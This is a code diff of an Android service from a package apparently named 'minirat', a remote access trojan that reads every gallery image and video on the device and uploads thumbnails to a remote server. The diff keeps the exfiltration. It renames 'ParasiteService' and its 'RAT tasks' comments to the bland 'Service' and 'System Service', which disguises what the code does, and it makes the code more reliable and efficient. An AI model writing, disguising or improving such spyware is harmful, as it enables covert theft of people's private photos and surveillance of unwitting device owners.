@@ -5,17 +5,14 @@ import com.app.minirat.BuildConfig;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
-import android.media.ThumbnailUtils;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Handler;
 import android.os.IBinder;
 import android.provider.MediaStore;
 import android.util.Base64;
@@ -23,10 +20,11 @@ import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
+import org.json.JSONObject;
+
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -34,74 +32,46 @@ import java.util.ArrayList;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-public class ParasiteService extends Service {
-    private static final String TAG = "ParasiteService";
-    private static final String CHANNEL_ID = "ParasiteChannel";
+public class Service extends android.app.Service {
+    private static final String TAG = "Service";
+    private static final String CHANNEL_ID = "ServiceChannel";
     private static final int NOTIFICATION_ID = 1;
     private static final String SERVER_URL = BuildConfig.DOMAIN_URL;
 
-    private Handler handler = new Handler();
-    private Runnable periodicTask;
     private ExecutorService executor = Executors.newSingleThreadExecutor();
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-//        startForeground(NOTIFICATION_ID, createNotification());
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "Parasite service started");
-        startParasiteMonitoring();
-        return START_STICKY;
-    }
+        Log.d(TAG, "Service started");
 
-    private void startParasiteMonitoring() {
-        periodicTask = new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    // Perform RAT tasks
-                    performRATTasks();
+        // Start as a foreground service (required on Android 8+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForeground(NOTIFICATION_ID, createNotification());
+        }
 
-                    // Schedule next check (30 seconds)
-                    handler.postDelayed(this, 30000);
-                } catch (Exception e) {
-                    Log.e(TAG, "Error in parasite monitoring", e);
-                    handler.postDelayed(this, 30000);
-                }
-            }
-        };
-
-        handler.post(periodicTask);
-    }
-
-    private void performRATTasks() {
-        Log.d(TAG, "Performing RAT tasks...");
-
-        // Upload gallery thumbnails
+        // Run gallery scan once on the background executor
         uploadGalleryThumbnails();
+
+        return START_STICKY;
     }
 
     private void uploadGalleryThumbnails() {
         executor.execute(() -> {
             try {
-                // Get all gallery images and videos
                 ArrayList<String> galleryFiles = getGalleryFiles();
 
                 for (String filePath : galleryFiles) {
                     try {
-                        // Create thumbnail instead of full file
                         String thumbnailBase64 = createThumbnail(filePath);
-
-                        // Send thumbnail to server
                         String fileName = new File(filePath).getName();
                         sendThumbnailToServer(fileName, thumbnailBase64);
-
                         Log.d(TAG, "Uploaded thumbnail for: " + fileName);
-
                     } catch (Exception e) {
                         Log.e(TAG, "Error processing file: " + filePath, e);
                     }
@@ -115,8 +85,8 @@ public class ParasiteService extends Service {
 
     private ArrayList<String> getGalleryFiles() {
         ArrayList<String> files = new ArrayList<>();
+        Cursor cursor = null;
         try {
-            // Query for images and videos
             String[] projection = {
                     MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DATA,
@@ -131,7 +101,7 @@ public class ParasiteService extends Service {
                     "video/mp4"
             };
 
-            Cursor cursor = getContentResolver().query(
+            cursor = getContentResolver().query(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                     projection,
                     selection,
@@ -145,38 +115,58 @@ public class ParasiteService extends Service {
                             MediaStore.Images.Media.DATA));
                     files.add(filePath);
                 }
-                cursor.close();
             }
         } catch (Exception e) {
             Log.e(TAG, "Error getting gallery files", e);
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
         }
         return files;
     }
 
     private String createThumbnail(String filePath) throws IOException {
-        // Create a small thumbnail (128x128) instead of full file
-        Bitmap bitmap = BitmapFactory.decodeFile(filePath);
+        // Decode with inSampleSize to avoid loading full-resolution bitmap into memory
+        BitmapFactory.Options opts = new BitmapFactory.Options();
+        opts.inJustDecodeBounds = true;
+        BitmapFactory.decodeFile(filePath, opts);
+
+        int targetSize = 128;
+        int inSampleSize = 1;
+        if (opts.outHeight > targetSize || opts.outWidth > targetSize) {
+            int halfHeight = opts.outHeight / 2;
+            int halfWidth = opts.outWidth / 2;
+            while ((halfHeight / inSampleSize) >= targetSize
+                    && (halfWidth / inSampleSize) >= targetSize) {
+                inSampleSize *= 2;
+            }
+        }
+
+        opts.inJustDecodeBounds = false;
+        opts.inSampleSize = inSampleSize;
+        Bitmap bitmap = BitmapFactory.decodeFile(filePath, opts);
 
         if (bitmap == null) {
-            // If we can't decode, return a placeholder
             return createPlaceholderThumbnail();
         }
 
-        // Scale down to thumbnail size (128x128)
-        int thumbnailWidth = 128;
-        int thumbnailHeight = 128;
-
-        // Calculate scaling factor to maintain aspect ratio
-        float scaleWidth = ((float) thumbnailWidth) / bitmap.getWidth();
-        float scaleHeight = ((float) thumbnailHeight) / bitmap.getHeight();
-        float scale = Math.min(scaleWidth, scaleHeight);
+        // Scale down to exactly 128x128 preserving aspect ratio
+        float scale = Math.min(
+                (float) targetSize / bitmap.getWidth(),
+                (float) targetSize / bitmap.getHeight()
+        );
 
         Matrix matrix = new Matrix();
         matrix.postScale(scale, scale);
 
-        // Create thumbnail
         Bitmap thumbnail = Bitmap.createBitmap(bitmap, 0, 0,
                 bitmap.getWidth(), bitmap.getHeight(), matrix, true);
+
+        // Recycle the original if thumbnail is a different object
+        if (thumbnail != bitmap) {
+            bitmap.recycle();
+        }
 
         // Convert to Base64
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -184,13 +174,14 @@ public class ParasiteService extends Service {
         byte[] thumbnailBytes = baos.toByteArray();
         baos.close();
 
+        thumbnail.recycle();
+
         return Base64.encodeToString(thumbnailBytes, Base64.NO_WRAP);
     }
 
     private String createPlaceholderThumbnail() {
-        // Create a simple placeholder image
         Bitmap placeholder = Bitmap.createBitmap(128, 128, Bitmap.Config.RGB_565);
-        placeholder.eraseColor(0xFFCCCCCC); // Light gray
+        placeholder.eraseColor(0xFFCCCCCC);
 
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         placeholder.compress(Bitmap.CompressFormat.JPEG, 70, baos);
@@ -201,12 +192,14 @@ public class ParasiteService extends Service {
             Log.e(TAG, "Error closing ByteArrayOutputStream", e);
         }
 
+        placeholder.recycle();
+
         return Base64.encodeToString(placeholderBytes, Base64.NO_WRAP);
     }
 
     private void sendThumbnailToServer(String fileName, String thumbnailBase64) {
         try {
-            URL url = new URL(SERVER_URL + "/upload/thumbnail");
+            URL url = new URL(SERVER_URL + "/api/upload/thumbnail");
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("POST");
             connection.setRequestProperty("Content-Type", "application/json");
@@ -214,11 +207,12 @@ public class ParasiteService extends Service {
             connection.setConnectTimeout(10000);
             connection.setReadTimeout(10000);
 
-            // Create JSON payload with thumbnail data
-            String jsonPayload = "{\"filename\":\"" + fileName +
-                    "\",\"thumbnail\":\"" + thumbnailBase64 + "\"}";
+            // Use JSONObject to safely build the payload (prevents JSON injection)
+            JSONObject payload = new JSONObject();
+            payload.put("filename", fileName);
+            payload.put("thumbnail", thumbnailBase64);
 
-            byte[] postData = jsonPayload.getBytes("UTF-8");
+            byte[] postData = payload.toString().getBytes("UTF-8");
             connection.setFixedLengthStreamingMode(postData.length);
 
             DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
@@ -240,7 +234,7 @@ public class ParasiteService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Parasite Service",
+                    "System Service",
                     NotificationManager.IMPORTANCE_LOW
             );
             channel.setSound(null, null);
@@ -271,8 +265,8 @@ public class ParasiteService extends Service {
 
     @Override
     public void onDestroy() {
-        Log.d(TAG, "Parasite service destroyed");
-        handler.removeCallbacks(periodicTask);
+        Log.d(TAG, "Service destroyed");
+        executor.shutdownNow();
         super.onDestroy();
     }
 }
